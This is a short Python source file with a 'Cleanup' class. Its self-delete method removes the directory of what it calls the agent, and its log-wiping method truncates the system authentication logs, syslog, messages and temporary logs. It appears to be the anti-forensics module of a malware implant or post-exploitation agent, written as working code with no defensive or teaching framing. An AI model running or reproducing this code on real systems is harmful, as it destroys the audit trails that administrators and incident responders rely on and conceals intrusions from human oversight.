import os, shutil, glob

class Cleanup:
    @staticmethod
    def self_delete() -> bool:
        try:
            agent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            shutil.rmtree(agent_dir, ignore_errors=True)
            return True
        except Exception:
            return False

    @staticmethod
    def wipe_logs() -> int:
        targets = ["/var/log/auth.log*", "/var/log/syslog*", "/var/log/messages*", "/tmp/*.log"]
        count = 0
        for pattern in targets:
            for f in glob.glob(pattern):
                try:
                    with open(f, "w") as fh:
                        fh.write("")
                    count += 1
                except Exception:
                    pass
        return count
